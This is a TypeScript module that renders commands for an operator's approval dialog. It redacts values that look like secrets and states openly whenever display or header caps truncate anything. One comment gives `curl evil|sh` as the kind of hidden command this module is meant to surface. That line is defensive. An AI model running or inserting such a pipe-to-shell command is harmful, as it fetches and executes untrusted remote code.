// ---------------------------------------------------------------------------
// Summarize a command for display in the permission dialog.
//
// Two representations, deliberately kept separate:
//
//   summarizeCommand() — a one-line, 80-char summary. Truncating is fine here
//     because this feeds logs and the PAM grant justification, never a consent
//     decision.
//
//   describeCommand() — the full argv, one element per line, for the operator
//     to read before approving. This one must never elide silently: an
//     operator who cannot see the whole command cannot meaningfully consent to
//     it, and a truncated tail is exactly where a hostile caller would hide
//     `--command=curl evil|sh`. The caps below exist only to bound dialog size,
//     and each one states in the rendered output that it fired.
//
// Both redact values that look like credentials or secrets.
// ---------------------------------------------------------------------------

import { basename } from "node:path";
import { stripControlChars } from "./sanitize.ts";

/** Maximum length for the full summarized command string. */
const MAX_SUMMARY_LENGTH = 80;

/**
 * Maximum number of argv elements retained for display and audit. Beyond this
 * the description states how many were dropped.
 */
export const MAX_COMMAND_ARGS = 512;

/** Maximum characters retained per argv element before an explicit marker. */
export const MAX_ARG_DISPLAY_CHARS = 2000;

/** Maximum characters across all retained elements before an explicit marker. */
export const MAX_TOTAL_DISPLAY_CHARS = 32_768;

/**
 * Patterns that suggest an argument value is a secret.
 *
 * Matches:
 *   - Long base64-ish strings (40+ chars of [A-Za-z0-9+/=_-])
 *   - Key=value pairs where the key contains a sensitive word
 */
const SECRET_VALUE_RE = /^[A-Za-z0-9+/=_-]{40,}$/;
const JWT_VALUE_RE = /^[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}$/;
// The sensitive word must be the LAST word of the key/flag name: `--api-key`
// and `--token` take secret values, while `--token-ttl-seconds` or
// `--auth-type` take benign ones. Redacting those would hide from the approval
// dialog exactly the values the operator must see to judge the request.
const SECRET_KEY_RE =
  /^-*[^=:]*?(?:^|[-_])(?:password|passwd|secret|token|credential|credentials|key|auth|authorization|private)[=:]/i;
const SECRET_FLAG_WORD_RE =
  /(?:^|[-_])(?:password|passwd|secret|token|credential|credentials|key|auth|authorization)$/i;

/** Redact an argument if it looks like a secret value. */
function redactArg(arg: string): string {
  // Redact long random-looking values (likely tokens/keys)
  if (SECRET_VALUE_RE.test(arg)) {
    return "***";
  }

  // JWTs contain dots, so they do not match the base64-ish pattern above.
  // Keep the length guard to avoid hiding ordinary dotted version numbers.
  if (arg.length >= 40 && JWT_VALUE_RE.test(arg)) {
    return "***";
  }

  // Redact the value portion of key=value / key:value pairs with sensitive
  // keys. SECRET_KEY_RE accepts both `=` and `:` separators, so find whichever
  // one is present rather than assuming `=`.
  if (SECRET_KEY_RE.test(arg)) {
    const sepIdx = arg.search(/[=:]/);
    if (sepIdx >= 0) {
      return arg.slice(0, sepIdx + 1) + "***";
    }
  }

  return arg;
}

/**
 * Redact argv while preserving option/value relationships.
 *
 * Many CLIs accept both `--password=value` and `--password value`. Looking at
 * each element independently leaks the second form whenever the value is short
 * or contains punctuation, so a sensitive bare option also redacts the next
 * element. A `--` separator clears that relationship because subsequent
 * values are positional arguments.
 */
function redactArgs(args: string[]): string[] {
  const result: string[] = [];
  let redactNext = false;
  let optionsEnded = false;

  for (const arg of args) {
    if (arg === "--") {
      result.push(arg);
      redactNext = false;
      optionsEnded = true;
      continue;
    }

    if (redactNext) {
      result.push("***");
      redactNext = false;
      continue;
    }

    const redacted = redactArg(arg);
    result.push(redacted);
    if (
      redacted === arg &&
      !optionsEnded &&
      /^--?[^=:]+$/.test(arg) &&
      SECRET_FLAG_WORD_RE.test(arg.replace(/^-+/, ""))
    ) {
      redactNext = true;
    }
  }

  return result;
}

/**
 * Summarize a command for safe display in a permission dialog.
 *
 * - Always includes the binary name (basename only, no path).
 * - Includes redacted arguments, truncated to {@link MAX_SUMMARY_LENGTH}.
 * - Returns `undefined` if the input is empty.
 */
export function summarizeCommand(command: string[]): string | undefined {
  if (command.length === 0) return undefined;

  const binaryPath = command[0]!;
  const binary = basename(binaryPath);

  if (command.length === 1) return stripControlChars(binary);

  const redactedArgs = redactArgs(command.slice(1));
  const full = stripControlChars(`${binary} ${redactedArgs.join(" ")}`);

  if (full.length <= MAX_SUMMARY_LENGTH) return full;

  return `${full.slice(0, MAX_SUMMARY_LENGTH - 1)}\u2026`;
}

/** A command rendered for operator review before an approval decision. */
export interface CommandDisplay {
  /**
   * Redacted argv with `argv[0]` reduced to its basename. Capped per
   * {@link MAX_COMMAND_ARGS} / {@link MAX_ARG_DISPLAY_CHARS} /
   * {@link MAX_TOTAL_DISPLAY_CHARS}; {@link capped} says whether that happened.
   */
  argv: string[];
  /**
   * Display lines: one numbered line per retained argv element, followed by an
   * explicit notice line if any cap fired. Never contains a silent elision.
   */
  lines: string[];
  /** One-line summary, as {@link summarizeCommand}. For logs and justifications. */
  summary: string;
  /** Number of arguments the caller reported, before any cap. */
  totalArgs: number;
  /** True if any cap fired. Always accompanied by a notice line in {@link lines}. */
  capped: boolean;
}

/** Clamp a single argument, stating the number of characters withheld. */
function clampArg(value: string): { text: string; clamped: boolean } {
  if (value.length <= MAX_ARG_DISPLAY_CHARS) return { text: value, clamped: false };
  const withheld = value.length - MAX_ARG_DISPLAY_CHARS;
  return { text: `${value.slice(0, MAX_ARG_DISPLAY_CHARS)} …(+${withheld} chars)`, clamped: true };
}

/**
 * Describe a command in full for an approval dialog.
 *
 * Unlike {@link summarizeCommand} this never elides silently: every retained
 * argument appears on its own numbered line, and if a cap fires the output says
 * so and how much it withheld. An operator can therefore trust that what they
 * see is either the whole command or an explicit statement that it isn't.
 *
 * Returns `undefined` if the input is empty.
 */
export function describeCommand(command: string[]): CommandDisplay | undefined {
  const summary = summarizeCommand(command);
  if (summary === undefined) return undefined;

  const argv: string[] = [];
  let capped = false;
  let remaining = MAX_TOTAL_DISPLAY_CHARS;
  let stoppedOn: "args" | "chars" | undefined;
  const redactedCommand = [command[0]!, ...redactArgs(command.slice(1))];

  for (const [index, raw] of redactedCommand.entries()) {
    if (index >= MAX_COMMAND_ARGS) {
      stoppedOn = "args";
      break;
    }

    // Strip control characters per element, not on a joined string: an
    // embedded newline must not be able to forge a line in the numbered list.
    const value = stripControlChars(index === 0 ? basename(raw) : raw);
    const { text, clamped } = clampArg(value);
    if (clamped) capped = true;

    if (text.length > remaining) {
      stoppedOn = "chars";
      break;
    }

    remaining -= text.length;
    argv.push(text);
  }

  const width = String(argv.length).length;
  const lines = argv.map((text, i) => `  ${String(i + 1).padStart(width)}  ${text}`);

  if (stoppedOn !== undefined) {
    capped = true;
    const omitted = command.length - argv.length;
    const reason =
      stoppedOn === "args"
        ? `argument limit ${MAX_COMMAND_ARGS}`
        : `${MAX_TOTAL_DISPLAY_CHARS}-character display limit`;
    lines.push(`  … ${omitted} further argument(s) not shown (${reason})`);
  }

  return { argv, lines, summary, totalArgs: command.length, capped };
}

/**
 * Byte budget for the encoded `X-Wrapped-Command` header.
 *
 * Well under the gate's HTTP server header limit (measured: Bun answers 431
 * somewhere above 16 KiB), because both failure modes past that limit are
 * unacceptable. A 431 fails the whole prod request; worse, Bun's *client*
 * silently omits a sufficiently large header rather than erroring, which would
 * present the operator with an unlabelled "grant prod access?" dialog — a
 * blind approval, the precise thing this module exists to prevent.
 */
export const MAX_COMMAND_HEADER_BYTES = 8192;

/**
 * Encode an argv for the `X-Wrapped-Command` header, bounded so it can never
 * be dropped or rejected in transit.
 *
 * When the command does not fit, trailing arguments are replaced by a marker
 * element that states how many were dropped, so the operator sees a claim
 * about what is missing rather than a silently shorter command.
 *
 * Returns `undefined` for an empty command.
 */
export function encodeCommandHeader(command: string[]): string | undefined {
  if (command.length === 0) return undefined;

  const encoder = new TextEncoder();
  const full = JSON.stringify(command);
  if (encoder.encode(full).length <= MAX_COMMAND_HEADER_BYTES) return full;

  // Leave room for the marker element the trimmed encoding always carries.
  const budget = MAX_COMMAND_HEADER_BYTES - 160;
  const kept: string[] = [];
  let bytes = 2; // the enclosing []

  for (const arg of command) {
    if (kept.length >= MAX_COMMAND_ARGS) break;
    const cost = encoder.encode(JSON.stringify(arg)).length + (kept.length > 0 ? 1 : 0);
    if (bytes + cost > budget) break;
    bytes += cost;
    kept.push(arg);
  }

  // A single argument larger than the whole budget would otherwise leave us
  // sending nothing but the marker; keep a clamped argv[0] so the operator at
  // least sees what binary is being run.
  if (kept.length === 0) {
    const binary = command[0]!;
    const prefix = binary.slice(0, 200);
    const withheld = binary.length - prefix.length;
    kept.push(`${prefix} …(+${withheld} chars omitted by the client from argv[0])`);
  }

  const omitted = command.length - kept.length;
  if (omitted > 0) {
    kept.push(`… ${omitted} further argument(s) omitted by the client (header size limit)`);
  }
  return JSON.stringify(kept);
}

/**
 * Parse the `X-Wrapped-Command` header value into a command array.
 *
 * Imposes no length bound of its own: {@link encodeCommandHeader} bounds the
 * header at the sending end, where the count of what was dropped is still
 * known and can be stated. Dropping the header here would instead silently
 * show the operator "no command reported" — the exact failure mode this module
 * exists to prevent. Display bounds live in {@link describeCommand}, where
 * they can likewise be stated.
 *
 * Returns `undefined` if the header is missing, empty, or invalid JSON.
 */
export function parseCommandHeader(headerValue: string | null): string[] | undefined {
  if (!headerValue) return undefined;

  try {
    const parsed: unknown = JSON.parse(headerValue);

    if (!Array.isArray(parsed)) return undefined;
    if (!parsed.every((v) => typeof v === "string")) return undefined;
    if (parsed.length === 0) return undefined;

    return parsed as string[];
  } catch {
    return undefined;
  }
}
